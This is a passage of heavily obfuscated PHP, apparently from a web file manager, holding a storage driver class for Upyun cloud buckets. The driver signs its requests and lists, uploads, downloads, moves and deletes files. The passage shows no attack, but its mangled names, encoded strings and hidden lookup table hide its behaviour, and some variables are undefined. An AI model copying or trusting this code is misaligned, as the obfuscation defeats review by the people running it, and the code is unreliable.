strtoupper(substr(PHP_OS, 0, 3)) == $—·[1137]) { return !1; } $»®‘“—Ï¿ = KodIO::parse($Ñéà¶Íó…); if ($»®‘“—Ï¿[$—·[29]] == KodIO::KOD_SOURCE) { $º¼¬ = Model($—·[827])->fileInfoGet(KodIO::sourceID($Ñéà¶Íó…)); if (!$º¼¬[$—·[76]]) { show_json($—·[1138], !1); } $Ñéà¶Íó… = $º¼¬[$—·[76]]; } $½ÕÒñü = self::init($Ñéà¶Íó…); if ($½ÕÒñü->pathParse[$—·[1086]]) { $Ñéà¶Íó… = $½ÕÒñü->pathParse[$—·[1086]]; $½ÕÒñü = self::init($Ñéà¶Íó…); } $óš = $½ÕÒñü->getType(); if ($óš == $—·[106] || $óš == $—·[1139]) { if (!$½ÕÒñü->exist($½ÕÒñü->path)) { show_json(LNG($—·[105]), !1); } return $½ÕÒñü->path; } return !1; } private static function archiveExt($÷¡¶óÁø» = '') { $GLOBALS[$_SERVER[èÍ×öˆøÉ][1140]] = $÷¡¶óÁø»; } } goto a„ÏøùÕ‡­; c×èâõÉ“Ï: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\x70\72\x2f\x2f\x76\60\x2e\141\160\151\x2e\x75\160\x79\x75\156\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($ş‰ÇÇ‰ıñì) { parent::__construct(); $this->_init($ş‰ÇÇ‰ıñì); } public function _init($î¥ú˜ïñô€) { $Ü…Ô =& $_SERVER[èÍ×öˆøÉ]; foreach ($î¥ú˜ïñô€ as $è”ÁàñÜ¾‚Á => $¨–²¸âå) { if (isset($this->{$è”ÁàñÜ¾‚Á})) { $this->{$è”ÁàñÜ¾‚Á} = $¨–²¸âå; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ü…Ô[1381] . LNG($Ü…Ô[1312])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($–Ìó¦®, $éŞÚ¶ğÈÅ’ = "\107\x45\124") { $ã¥ =& $_SERVER[èÍ×öˆøÉ]; $¸û¢æ•õ = gmdate($ã¥[1345]); $ÜÁ = base64_encode(hash_hmac($ã¥[1382], "{$éŞÚ¶ğÈÅ’}\x26{$–Ìó¦®}\x26{$¸û¢æ•õ}", md5("{$this->userpass}"), !0)); $¨üäõ£ = array("\x41\165\x74\150\x6f\x72\x69\x7a\x61\x74\x69\x6f\x6e\x3a\125\120\131\125\x4e\40{$this->username}\x3a{$ÜÁ}", "\x44\x61\x74\x65\72{$¸û¢æ•õ}"); return $¨üäõ£; } public function ussRequest($¨ˆƒ, $Æ±Œ¸ = "\107\105\x54", $ç‹§ = false, $Ó¤Œ = false, $™±‰µ™Œá—© = false) { $¤Õ„Øí =& $_SERVER[èÍ×öˆøÉ]; $¨ˆƒ = trim($¨ˆƒ, $¤Õ„Øí[8]); $ÍÔÏµóÈ = "\57{$this->bucket}\x2f{$¨ˆƒ}"; $­ÕØ¯¿¨ = $this->ussHeaders($ÍÔÏµóÈ, $Æ±Œ¸); if ($Ó¤Œ) { $­ÕØ¯¿¨ = array_merge($­ÕØ¯¿¨, $Ó¤Œ); } $İÈ—Õ·ÛÎ·øÅ = url_request($this->endpoint . $ÍÔÏµóÈ, $Æ±Œ¸, $ç‹§, $­ÕØ¯¿¨, $™±‰µ™Œá—©); if (!$İÈ—Õ·ÛÎ·øÅ) { return array($¤Õ„Øí[1124] => !1, $¤Õ„Øí[1126] => $¤Õ„Øí[1383]); } if (strtolower($Æ±Œ¸) == $¤Õ„Øí[190] || in_array($İÈ—Õ·ÛÎ·øÅ[$¤Õ„Øí[1124]], array($¤Õ„Øí[1239], $¤Õ„Øí[1384]))) { $ç‹§ = $İÈ—Õ·ÛÎ·øÅ[$¤Õ„Øí[1385]]; } else { $ç‹§ = json_decode($İÈ—Õ·ÛÎ·øÅ[$¤Õ„Øí[1126]], !0); if (!$ç‹§) { $ç‹§ = $İÈ—Õ·ÛÎ·øÅ[$¤Õ„Øí[1126]]; } else { if (!$İÈ—Õ·ÛÎ·øÅ[$¤Õ„Øí[745]] && isset($ç‹§[$¤Õ„Øí[1386]])) { $ç‹§ = $ç‹§[$¤Õ„Øí[1386]]; } } } return array($¤Õ„Øí[1124] => $İÈ—Õ·ÛÎ·øÅ[$¤Õ„Øí[745]], $¤Õ„Øí[1126] => $ç‹§); } public function mkfile($‰óá¯–, $»º = '', $¬±” = REPEAT_RENAME) { if ($this->setContent($‰óá¯–, $»º)) { return $this->getPathOuter($‰óá¯–); } return !1; } public function mkdir($´¾Ä¾¦ø›Ñ, $¸¦ûÖ”—ÆÊß = REPEAT_SKIP) { $À¬œ÷¡ =& $_SERVER[èÍ×öˆøÉ]; $‹ÒÅõ²ô = trim($´¾Ä¾¦ø›Ñ, $À¬œ÷¡[8]); if ($this->_isFolder($‹ÒÅõ²ô)) { return $this->getPathOuter($‹ÒÅõ²ô); } $ó›ß’ªÀì = array($À¬œ÷¡[1387]); $Òû¬·ÁÏŸ = $this->ussRequest($‹ÒÅõ²ô, $À¬œ÷¡[224], !1, $ó›ß’ªÀì); return $Òû¬·ÁÏŸ[$À¬œ÷¡[1124]] ? $this->getPathOuter($‹ÒÅõ²ô) : !1; } public function copyFile($İœæ®‚ÃË, $ßäÙ×á) { $‡İ«‘ =& $_SERVER[èÍ×öˆøÉ]; $ÊƒœİÌåøÙ = array($‡İ«‘[1388] . "\x2f{$this->bucket}\57{$İœæ®‚ÃË}", $‡İ«‘[1389]); $ïÎÎ‡‰ = $this->ussRequest($ßäÙ×á, $‡İ«‘[226], !1, $ÊƒœİÌåøÙ); return $ïÎÎ‡‰[$‡İ«‘[1124]] ? !0 : $this->getPathOuter($ßäÙ×á); } public function moveFile($ß¥À‡«¿ƒÓ¼, $˜íŞÊ”ĞùĞ) { $Çá =& $_SERVER[èÍ×öˆøÉ]; $˜Ô••·Ãƒ = array($Çá[1390] . "\x2f{$this->bucket}\x2f{$ß¥À‡«¿ƒÓ¼}", $Çá[1389]); $†¾¶ = $this->ussRequest($˜íŞÊ”ĞùĞ, $Çá[226], !1, $˜Ô••·Ãƒ); return $†¾¶[$Çá[1124]] ? !0 : $this->getPathOuter($˜íŞÊ”ĞùĞ); } public function delFile($»‰ÅÑ¾Ä¡Í) { $Ø½ûñÚã‚‡ı =& $_SERVER[èÍ×öˆøÉ]; $êï¹Ú™Ç¸ = $this->ussRequest($»‰ÅÑ¾Ä¡Í, $Ø½ûñÚã‚‡ı[1391]); return $êï¹Ú™Ç¸[$Ø½ûñÚã‚‡ı[1124]] ? !0 : !1; } public function delFolder($ÒÖã™Û…ğáÉ) { $–Âœ’Ÿ =& $_SERVER[èÍ×öˆøÉ]; if (!$this->exist($ÒÖã™Û…ğáÉ)) { return !0; } $this->listItemCache = !1; $–Îæ‹ş«ºº = $œ°† = array(); $this->fileList($ÒÖã™Û…ğáÉ, $–Îæ‹ş«ºº, $œ°†, !0); $this->listItemCache = !0; foreach ($œ°† as $²±’İøÏí) { $ŞŸ = $this->ussRequest($²±’İøÏí[$–Âœ’Ÿ[28]], $–Âœ’Ÿ[1391]); if (!$ŞŸ[$–Âœ’Ÿ[1124]]) { return !1; } } foreach ($–Îæ‹ş«ºº as $ü¨ªÓ¸˜¹í®ê) { $ŞŸ = $this->ussRequest($ü¨ªÓ¸˜¹í®ê, $–Âœ’Ÿ[1391]); if (!$ŞŸ[$–Âœ’Ÿ[1124]]) { return !1; } } $ŞŸ = $this->ussRequest($ÒÖã™Û…ğáÉ, $–Âœ’Ÿ[1391]); return $ŞŸ[$–Âœ’Ÿ[1124]]; } public function rename($Æîó¯, $£Ãƒ†÷) { if ($this->isFile($Æîó¯)) { $£Ãƒ†÷ = get_path_father($Æîó¯) . $£Ãƒ†÷; return $this->moveFile($Æîó¯, $£Ãƒ†÷); } return $this->renameObject($Æîó¯, $£Ãƒ†÷); } public function fileInfo($Òôû«Â‡¥, $©Ãß‚ô€©‰†œ = false, $½Ğı = array()) { $€·Ôºàù† =& $_SERVER[èÍ×öˆøÉ]; $¶„Í = array($€·Ôºàù†[28] => $this->pathThis($Òôû«Â‡¥), $€·Ôºàù†[76] => $this->getPathOuter($€·Ôºàù†[8] . $Òôû«Â‡¥), $€·Ôºàù†[29] => $€·Ôºàù†[193], $€·Ôºàù†[78] => isset($½Ğı[$€·Ôºàù†[78]]) ? $½Ğı[$€·Ôºàù†[78]] : 0, $€·Ôºàù†[168] => $this->ext($Òôû«Â‡¥)); if ($©Ãß‚ô€©‰†œ) { return $¶„Í; } $¶„Í[$€·Ôºàù†[194]] = $¶„Í[$€·Ôºàù†[84]] = 0; $¶„Í[$€·Ôºàù†[195]] = $¶„Í[$€·Ôºàù†[196]] = !0; if (empty($½Ğı)) { $½Ğı = $this->objectMeta($Òôû«Â‡¥); if (!$½Ğı) { return $¶„Í; } } $¶„Í[$€·Ôºàù†[194]] = intval($½Ğı[$€·Ôºàù†[1392]]); $¶„Í[$€·Ôºàù†[84]] = intval($½Ğı[$€·Ôºàù†[1393]]); $¶„Í[$€·Ôºàù†[78]] = $½Ğı[$€·Ôºàù†[78]]; return $¶„Í; } public function folderInfo($‘­ÄíëĞé, $Œ»î©Ãë§ = false) { $Š” =& $_SERVER[èÍ×öˆøÉ]; $ğœÛÌÖ = array($Š”[28] => $this->pathThis($‘­ÄíëĞé), $Š”[76] => $this->getPathOuter($Š”[8] . $‘­ÄíëĞé), $Š”[29] => $Š”[77]); if ($Œ»î©Ãë§) { return $ğœÛÌÖ; } $ğœÛÌÖ[$Š”[194]] = $ğœÛÌÖ[$Š”[84]] = 0; $ğœÛÌÖ[$Š”[195]] = $ğœÛÌÖ[$Š”[196]] = !0; if (empty($œ×ÑÇÖÜâŸõ)) { $œ×ÑÇÖÜâŸõ = $this->objectMeta($‘­ÄíëĞé); if (!$œ×ÑÇÖÜâŸõ) { return $ğœÛÌÖ; } } $ğœÛÌÖ[$Š”[194]] = intval($œ×ÑÇÖÜâŸõ[$Š”[1392]]); $ğœÛÌÖ[$Š”[84]] = intval($œ×ÑÇÖÜâŸõ[$Š”[1393]]); return $ğœÛÌÖ; } private function listObjs($…ü½ÇìÀí, $§–è©›åÚù = 0, $Ï”±¿ôˆ  = 1000) { $¼ÌÇ‰ë£ =& $_SERVER[èÍ×öˆøÉ]; $Êİş’¥Ö = array($¼ÌÇ‰ë£[1394], $¼ÌÇ‰ë£[1395] . $Ï”±¿ôˆ ); if ($§–è©›åÚù) { $Êİş’¥Ö[] = $¼ÌÇ‰ë£[1396] . $§–è©›åÚù; } $Éñû×•âöôñ = $this->ussRequest($…ü½ÇìÀí, $¼ÌÇ‰ë£[228], !1, $Êİş’¥Ö); return !$Éñû×•âöôñ[$¼ÌÇ‰ë£[1124]] ? !1 : $Éñû×•âöôñ[$¼ÌÇ‰ë£[1126]]; } private function fileList($‡š®ô‚œ–©ùÇ, &$ØñÄèçè§, &$²¹ÖˆÍ¼ß, $®ß³÷ = false) { $¼¢¢«ò”½ =& $_SERVER[èÍ×öˆøÉ]; $æ¯µìçæË = $¼¢¢«ò”½[33]; $ÑïÒÏÆ = 1000; $˜“¡ = rtrim($‡š®ô‚œ–©ùÇ, $¼¢¢«ò”½[8]) . $¼¢¢«ò”½[8]; $ˆŒçşÛˆ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $äıÁ·‹ñİØ» = $this->listObjs($‡š®ô‚œ–©ùÇ, $æ¯µìçæË, $ÑïÒÏÆ); if (!$äıÁ·‹ñİØ») { return !1; } $æ¯µìçæË = isset($äıÁ·‹ñİØ»[$¼¢¢«ò”½[1397]]) ? $äıÁ·‹ñİØ»[$¼¢¢«ò”½[1397]] : $¼¢¢«ò”½[33]; $´ï = isset($äıÁ·‹ñİØ»[$¼¢¢«ò”½[1398]]) ? $äıÁ·‹ñİØ»[$¼¢¢«ò”½[1398]] : array(); foreach ($´ï as $ä²À¶‰­í¢) { $‚é = $ä²À¶‰­í¢[$¼¢¢«ò”½[29]] == $¼¢¢«ò”½[77] ? !0 : !1; $Ùêä–Æë¯Å = ltrim($˜“¡ . $ä²À¶‰­í¢[$¼¢¢«ò”½[28]], $¼¢¢«ò”½[8]) . ($‚é ? $¼¢¢«ò”½[8] : $¼¢¢«ò”½[33]); $…ÌÒÊ„©÷ = array($¼¢¢«ò”½[28] => $Ùêä–Æë¯Å, $¼¢¢«ò”½[29] => $‚é ? $¼¢¢«ò”½[77] : $¼¢¢«ò”½[193], $¼¢¢«ò”½[78] => $ä²À¶‰­í¢[$¼¢¢«ò”½[335]], $¼¢¢«ò”½[1393] => $ä²À¶‰­í¢[$¼¢¢«ò”½[1399]]); if ($ˆŒçşÛˆ) { $this->cacheMethod($¼¢¢«ò”½[199], $Ùêä–Æë¯Å, $‚é); $this->cacheMethod($¼¢¢«ò”½[200], $Ùêä–Æë¯Å, $…ÌÒÊ„©÷); } if ($‚é) { $ØñÄèçè§[] = $Ùêä–Æë¯Å; if ($®ß³÷) { $this->fileList($Ùêä–Æë¯Å, $ØñÄèçè§, $²¹ÖˆÍ¼ß, $®ß³÷); } continue; } $²¹ÖˆÍ¼ß[] = $…ÌÒÊ„©÷; } if (count($´ï) < $ÑïÒÏÆ) { break; } } if ($ˆŒçşÛˆ) { $this->cacheMethod($¼¢¢«ò”½[199], $‡š®ô‚œ–©ùÇ, !0); } } public function listPath($”¯À›Ã¥¨â, $„ÅƒÓ±¡ŠéÙ = false) { $â’å =& $_SERVER[èÍ×öˆøÉ]; $Û‘¾¤¤Âšß¾ = $š¯Üè°× = array(); $this->fileList($”¯À›Ã¥¨â, $Û‘¾¤¤Âšß¾, $š¯Üè°×); foreach ($Û‘¾¤¤Âšß¾ as $¹¿‡ => $™Âü»‹®°) { $Û‘¾¤¤Âšß¾[$¹¿‡] = $this->folderInfo($™Âü»‹®°, $„ÅƒÓ±¡ŠéÙ); } foreach ($š¯Üè°× as $¹¿‡ => $™Âü»‹®°) { $š¯Üè°×[$¹¿‡] = $this->fileInfo($™Âü»‹®°[$â’å[28]], $„ÅƒÓ±¡ŠéÙ, $™Âü»‹®°); } return array($â’å[75] => $Û‘¾¤¤Âšß¾, $â’å[74] => $š¯Üè°×); } public function has($®Ê, $½²â¾é = false, $æƒ = true) { $ã–”é¥Í¦ƒ¸ =& $_SERVER[èÍ×öˆøÉ]; $²ùúŞè¬ = $ã–”é¥Í¦ƒ¸[33]; $ÒÖæÅØ¿í³„² = 500; $Æ€Ø = 0; $³°Ø¦„ÓÙ = 0; $‡ÃÆÁ¾Ğş = rtrim($®Ê, $ã–”é¥Í¦ƒ¸[8]) . $ã–”é¥Í¦ƒ¸[8]; while (!0) { check_abort(); $ãÊçÉ±˜úëô = $this->listObjs($®Ê, $²ùúŞè¬, $ÒÖæÅØ¿í³„²); if (!$ãÊçÉ±˜úëô) { return !1; } $²ùúŞè¬ = isset($ãÊçÉ±˜úëô[$ã–”é¥Í¦ƒ¸[1397]]) ? $ãÊçÉ±˜úëô[$ã–”é¥Í¦ƒ¸[1397]] : $ã–”é¥Í¦ƒ¸[33]; $üğ = isset($ãÊçÉ±˜úëô[$ã–”é¥Í¦ƒ¸[1398]]) ? $ãÊçÉ±˜úëô[$ã–”é¥Í¦ƒ¸[1398]] : array(); if (empty($üğ)) { break; } $‹êÊÂ¶Ìâ = array_filter($üğ, function ($ı€˜ñç) { $´šåÕ¦îËÉåø =& $_SERVER[èÍ×öˆøÉ]; return $ı€˜ñç[$´šåÕ¦îËÉåø[29]] == $´šåÕ¦îËÉåø[77]; }); $»…´äø„ä = count($üğ); $‹êÊÂ¶Ìâ = count($‹êÊÂ¶Ìâ); $µÃíáÙÆ = $»…´äø„ä - $‹êÊÂ¶Ìâ; if ($½²â¾é) { $³°Ø¦„ÓÙ += $‹êÊÂ¶Ìâ; $Æ€Ø += $µÃíáÙÆ; if ($»…´äø„ä < $ÒÖæÅØ¿í³„²) { break; } continue; } if ($æƒ) { if ($µÃíáÙÆ) { return !0; } } else { if ($‹êÊÂ¶Ìâ) { return !0; } } if ($»…´äø„ä < $ÒÖæÅØ¿í³„²) { break; } } if ($½²â¾é) { return array($ã–”é¥Í¦ƒ¸[203] => $Æ€Ø, $ã–”é¥Í¦ƒ¸[204] => $³°Ø¦„ÓÙ); } return !1; } public function listAll($¬¸) { $ı¿ÒÀéÁ‚²¨ğ =& $_SERVER[èÍ×öˆøÉ]; $Ù = $ú³ = array(); $this->fileList($¬¸, $Ù, $ú³, !0); $—çˆ— = array(); foreach ($ú³ as $ôØŠºÍ‰»‘) { $—çˆ—[$ôØŠºÍ‰»‘[$ı¿ÒÀéÁ‚²¨ğ[28]]] = $ôØŠºÍ‰»‘[$ı¿ÒÀéÁ‚²¨ğ[78]]; } foreach ($Ù as $ôØŠºÍ‰»‘) { if (is_string($ôØŠºÍ‰»‘)) { $—çˆ—[$ôØŠºÍ‰»‘] = 0; } } return $this->listAllFiles($¬¸, array_keys($—çˆ—), $—çˆ—); } public function canRead($§Ï»ø) { return $this->exist($§Ï»ø) ? !0 : !1; } public function canWrite($Ïä) { return $this->exist($Ïä) ? !0 : !1; } public function getContent($”æ£åÜâ¦Œöë) { return $this->fileSubstr($”æ£åÜâ¦Œöë, 0, -1); } public function setContent($‡”, $Ïş±„Å¢›Õè = '') { $½¦ËĞùàúÍ‚ =& $_SERVER[èÍ×öˆøÉ]; if (!$Ïş±„Å¢›Õè) { $¡Æë²¿Ìú = $this->ussRequest($‡”, $½¦ËĞùàúÍ‚[224]); return $¡Æë²¿Ìú[$½¦ËĞùàúÍ‚[1124]]; } $±â = $this->tempFile($this->pathThis($‡”)); file_put_contents($±â, $Ïş±„Å¢›Õè); if ($this->upload($‡”, $±â)) { $this->tempFileRemve($±â); return !0; } return !1; } public function fileSubstr($„‰ê, $´í†áüò, $»Ù) { $…¥æ½†œ¯œ =& $_SERVER[èÍ×öˆøÉ]; if (!($ËÅ¥ìÍ­ß = $this->link($„‰ê))) { return !1; } $ïŸã‡ªÆ½ıß = !1; if ($»Ù > 0) { $Ô›•şœ’™Ø¥ = $´í†áüò + $»Ù - 1; $ïŸã‡ªÆ½ıß = array($…¥æ½†œ¯œ[1360] . $´í†áüò . $…¥æ½†œ¯œ[454] . $Ô›•şœ’™Ø¥); } $èèˆ = url_request($ËÅ¥ìÍ­ß, $…¥æ½†œ¯œ[228], !1, $ïŸã‡ªÆ½ıß); return $èèˆ[$…¥æ½†œ¯œ[745]] ? $èèˆ[$…¥æ½†œ¯œ[1126]] : !1; } public function upload($—ÁêºÛ®, $É†, $ñ¶³¥Šä  = false, $Ë ö‹íşçèÒ = REPEAT_REPLACE) { $Éò =& $_SERVER[èÍ×öˆøÉ]; $Ë°¥óî¤¾ = IO::size($É†); if ($Ë°¥óî¤¾ <= 1024 * 1024 * 200) { $¥šİ = array($Éò[1400] . $É†); $Ó®…ÓÓÉáæœ = $this->ussRequest($—ÁêºÛ®, $Éò[226], $¥šİ); return $Ó®…ÓÓÉáæœ[$Éò[1124]] ? $this->getPathOuter($—ÁêºÛ®) : !1; } $›ô¬© ‹é÷Ë = 1024 * 1024 * 10; $ÉúÒçÆÃÉ² = array($Éò[1401], $Éò[1402] . $Ë°¥óî¤¾, $Éò[1403], $Éò[1404] . $›ô¬© ‹é÷Ë); $Ó®…ÓÓÉáæœ = $this->ussRequest($—ÁêºÛ®, $Éò[226], !1, $ÉúÒçÆÃÉ²); if (!$Ó®…ÓÓÉáæœ[$Éò[1124]]) { return !1; } $ı¬œÇá¹£ = $Ó®…ÓÓÉáæœ[$Éò[1126]]; $ëõ¡¿ÛËŒúÉ = 0; $ŒŸÖ ’ó´Ÿõ = $ı¬œÇá¹£[$Éò[1405]]; $©Û©ÅåÌ¡ ¡İ = fopen($É†, $Éò[1309]); if (!$©Û©ÅåÌ¡ ¡İ) { return !1; } do { $„·Ù‡ = $ı¬œÇá¹£[$Éò[1406]]; fseek_64($©Û©ÅåÌ¡ ¡İ, $ëõ¡¿ÛËŒúÉ); $»´ = fread($©Û©ÅåÌ¡ ¡İ, $„·Ù‡); $È£ãıéÉ = 0; do { $È£ãıéÉ++; $ı¬œÇá¹£ = $this->uploadPart($—ÁêºÛ®, $ı¬œÇá¹£, $»´); } while (!$ı¬œÇá¹£ && $È£ãıéÉ < 3); if (!$ı¬œÇá¹£) { return !1; } $ŒŸÖ ’ó´Ÿõ = $ı¬œÇá¹£[$Éò[1405]]; $ëõ¡¿ÛËŒúÉ += $„·Ù‡; } while ($ŒŸÖ ’ó´Ÿõ != -1); fclose($©Û©ÅåÌ¡ ¡İ); $ÉúÒçÆÃÉ² = array($Éò[1407], $Éò[1408] . $ı¬œÇá¹£[$Éò[1409]], $Éò[1403]); $Ó®…ÓÓÉáæœ = $this->ussRequest($—ÁêºÛ®, $Éò[226], !1, $ÉúÒçÆÃÉ²); return $Ó®…ÓÓÉáæœ[$Éò[1124]] ? $this->getPathOuter($µäÖÃıÀşÔ) : !1; } private function uploadPart($²ßÒ, $¨ƒÄ„, &$§ºĞ§Ó”Şóªí) { $¨ºÓË =& $_SERVER[èÍ×öˆøÉ]; $ğË‡ˆâóÀ = array($¨ºÓË[1410], $¨ºÓË[1408] . $¨ƒÄ„[$¨ºÓË[1409]], $¨ºÓË[1411] . $¨ƒÄ„[$¨ºÓË[1405]], $¨ºÓË[141] . $¨ƒÄ„[$¨ºÓË[1406]]); $Ç°¨Ï = $this->ussRequest($²ßÒ, $¨ºÓË[226], $§ºĞ§Ó”Şóªí, $ğË‡ˆâóÀ); return !$Ç°¨Ï[$¨ºÓË[1124]] ? $Ç°¨Ï[$¨ºÓË[1124]] : $Ç°¨Ï[$¨ºÓË[1126]]; } public function uploadFormData($£ş‚¯ï, $úÔÊ–ÁßÂû¾ = 3600) { return $this->uploadPolicy($£ş‚¯ï, $úÔÊ–ÁßÂû¾); } public function multiUploadFormData($Œö©, $ÊÊÅ®ª‘¬ = 3600) { $ß× =& $_SERVER[èÍ×öˆøÉ]; $ï³ = (int) $GLOBALS[$ß×[7]][$ß×[78]]; return $this->uploadPolicy($Œö©, $ÊÊÅ®ª‘¬, $ï³); } private function uploadPolicy($éÅ™Ğ á, $Ê‡È÷‰å‘ıú² = 3600, $ãÜ = 0) { $Ÿ¶¤Ã‚ =& $_SERVER[èÍ×öˆøÉ]; $™ = $Ÿ¶¤Ã‚[8] . $this->bucket; $©ˆúÉ–Øƒ = gmdate($Ÿ¶¤Ã‚[1345]); $µ«ã„Î×¹ò = array($Ÿ¶¤Ã‚[1412] => $this->bucket, $Ÿ¶¤Ã‚[1413] => $éÅ™Ğ á, $Ÿ¶¤Ã‚[1414] => time() + $Ê‡È÷‰å‘ıú², $Ÿ¶¤Ã‚[1415] => $©ˆúÉ–Øƒ); if ($ãÜ) { $µ«ã„Î×¹ò[$Ÿ¶¤Ã‚[1325]] = $ãÜ; } $á«Öè = base64_encode(json_encode($µ«ã„Î×¹ò)); $Ñøİµ†”¢æíÂ = base64_encode(hash_hmac($Ÿ¶¤Ã‚[1382], "\120\117\x53\124\x26{$™}\x26{$©ˆúÉ–Øƒ}\46{$á«Öè}", md5("{$this->userpass}"), !0)); $ú‹ó‚› = array($Ÿ¶¤Ã‚[1251] => $á«Öè, $Ÿ¶¤Ã‚[1416] => "\x55\120\131\x55\x4e\40{$this->username}\x3a{$Ñøİµ†”¢æíÂ}", $Ÿ¶¤Ã‚[175] => $this->endpoint . $™); return $ú‹ó‚›; } public function download($‰Ôı, $Ší­) { $‘é = IO::getPathInner(IO::mkfile($Ší­)); if (!($˜å = $this->link($‰Ôı))) { return !1; } $ÉÁ§µ = 0; $Ğ¦³öÜÜèŒ = 1024 * 200; $§‹ÇÜ¬´ÇÄİ = fopen($‘é, $_SERVER[èÍ×öˆøÉ][1366]); while (!0) { $š˜Îãêš•â = $this->fileSubstr($‰Ôı, $ÉÁ§µ, $Ğ¦³öÜÜèŒ); if ($š˜Îãêš•â === !1) { return !1; } fwrite($§‹ÇÜ¬´ÇÄİ, $š˜Îãêš•â); $ÉÁ§µ += $Ğ¦³öÜÜèŒ; if (strlen($š˜Îãêš•â) < $Ğ¦³öÜÜèŒ) { break; } } fclose($§‹ÇÜ¬´ÇÄİ); return $Ší­; } public function link($ÆÈÌ°€‡Ú, $ÏÏ¬ = array()) { $ùÓ¹Ï Ê =& $_SERVER[èÍ×öˆøÉ]; $ÆÈÌ°€‡Ú = trim($ÆÈÌ°€‡Ú, $ùÓ¹Ï Ê[8]); if (!empty($this->token)) { $Ì¬ = strtotime(date($ùÓ¹Ï Ê[1417])); $áğ«»õ±»• = substr(md5($this->token . $ùÓ¹Ï Ê[282] . $Ì¬ . $ùÓ¹Ï Ê[1418] . $ÆÈÌ°€‡Ú), 12, 8) . $Ì¬; $ÏÏ¬[] = $ùÓ¹Ï Ê[1419] . $áğ«»õ±»•; } $ë˜Ä³•ˆİœİÑ = !empty($ÏÏ¬) ? $ùÓ¹Ï Ê[70] . implode($ùÓ¹Ï Ê[282], $ÏÏ¬) : $ùÓ¹Ï Ê[33]; return $this->getHost() . $ùÓ¹Ï Ê[8] . $ÆÈÌ°€‡Ú . $ë˜Ä³•ˆİœİÑ; } public function fileOut($®ÇëÀı³Œ, $È…è‰µã£…§ = false, $Ç»Ü¤³ = false, $ûšíÁ–½½’ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($®ÇëÀı³Œ, $È…è‰µã£…§, $Ç»Ü¤³, $ûšíÁ–½½’); } if (!$Ç»Ü¤³) { $Ç»Ü¤³ = $this->pathThis($®ÇëÀı³Œ); } $Åİğƒô‘× = $È…è‰µã£…§ ? array($_SERVER[èÍ×öˆøÉ][1420] . rawurlencode($Ç»Ü¤³)) : array(); $ûï†£» = $this->link($®ÇëÀı³Œ, $Åİğƒô‘×); $this->fileOutLink($ûï†£»); } public function fileOutServer($¿üÑÙ¦¡, $³à—Õï = false, $„²ê³Øí³È®Ş = false, $õøœ•ƒÄœ = '') { parent::fileOut($¿üÑÙ¦¡, $³à—Õï, $„²ê³Øí³È®Ş, $õøœ•ƒÄœ); } public function fileOutImage($ƒû¡³Áá§, $–£Î = 250) { $œØÛÙÚ•ƒ = $this->link($ƒû¡³Áá§ . $_SERVER[èÍ×öˆøÉ][1421] . $–£Î); $this->fileOutLink($œØÛÙÚ•ƒ); } public function fileOutImageServer($Ç¡ôšù¬°¡, $‰‹õ“»– = 250) { parent::fileOutImage($Ç¡ôšù¬°¡, $‰‹õ“»–); } public function hashMd5($¹“) { $ŠÉˆ– =& $_SERVER[èÍ×öˆøÉ]; $âªéğÈ’¼ = $this->_objectMeta($¹“); return isset($âªéğÈ’¼[$ŠÉˆ–[208]]) ? $âªéğÈ’¼[$ŠÉˆ–[208]] : !1; } public function size($ŞšÌé½­¡¬Ÿ) { $À Ûø = $this->objectMeta($ŞšÌé½­¡¬Ÿ); return $À Ûø ? $À Ûø[$_SERVER[èÍ×öˆøÉ][78]] : 0; } public function info($à·) { if ($this->isFolder($à·)) { return $this->folderInfo($à·); } else { if ($this->isFile($à·)) { return $this->fileInfo($à·); } } return !1; } public function exist($¡‹ò‰²Ö) { return $this->isFile($¡‹ò‰²Ö) || $this->isFolder($¡‹ò‰²Ö); } public function isFile($À˜) { return !$this->isFolder($À˜) && $this->objectMeta($À˜); } public function isFolder($¨àüšô) { return $this->cacheMethod($_SERVER[èÍ×öˆøÉ][199], $¨àüšô); } protected function objectMeta($Ë) { return $this->cacheMethod($_SERVER[èÍ×öˆøÉ][200], $Ë); } protected function _objectMeta($‘—ˆ¼Ö«õ) { $éÎõóÆ =& $_SERVER[èÍ×öˆøÉ]; if ($‘—ˆ¼Ö«õ == $éÎõóÆ[33] || $‘—ˆ¼Ö«õ == $éÎõóÆ[8]) { return array(); } $¼ú›Ï±Ëœ– = $this->ussRequest($‘—ˆ¼Ö«õ, $éÎõóÆ[1422]); if (!$¼ú›Ï±Ëœ–[$éÎõóÆ[1124]]) { return null; } $¸Ø¾÷Ä£„ = isset($¼ú›Ï±Ëœ–[$éÎõóÆ[1126]]) ? $¼ú›Ï±Ëœ–[$éÎõóÆ[1126]] : array(); if (!isset($¸Ø¾÷Ä£„[$éÎõóÆ[1423]])) { return null; } $¬³¼ = array($éÎõóÆ[29] => isset($¸Ø¾÷Ä£„[$éÎõóÆ[1423]]) ? $¸Ø¾÷Ä£„[$éÎõóÆ[1423]] : null, $éÎõóÆ[78] => isset($¸Ø¾÷Ä£„[$éÎõóÆ[1424]]) ? $¸Ø¾÷Ä£„[$éÎõóÆ[1424]] : null, $éÎõóÆ[208] => isset($¸Ø¾÷Ä£„[$éÎõóÆ[1425]]) ? $¸Ø¾÷Ä£„[$éÎõóÆ[1425]] : null, $éÎõóÆ[1392] => isset($¸Ø¾÷Ä£„[$éÎõóÆ[1426]]) ? $¸Ø¾÷Ä£„[$éÎõóÆ[1426]] : null); $¬³¼[$éÎõóÆ[1393]] = isset($¸Ø¾÷Ä£„[$éÎõóÆ[1427]]) ? strtotime($¸Ø¾÷Ä£„[$éÎõóÆ[1427]]) : $¬³¼[$éÎõóÆ[1392]]; return $¬³¼; } protected function _isFolder($§µ) { $”Â€ =& $_SERVER[èÍ×öˆøÉ]; if ($§µ == $”Â€[33] || $§µ == $”Â€[8]) { return !0; } $ş©àç = $this->_objectMeta($§µ); return isset($ş©àç[$”Â€[29]]) && $ş©àç[$”Â€[29]] == $”Â€[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ûúÁ = false) { } public function exist($ï·£ûºŒ) { $—×»²‹š…èÊ = 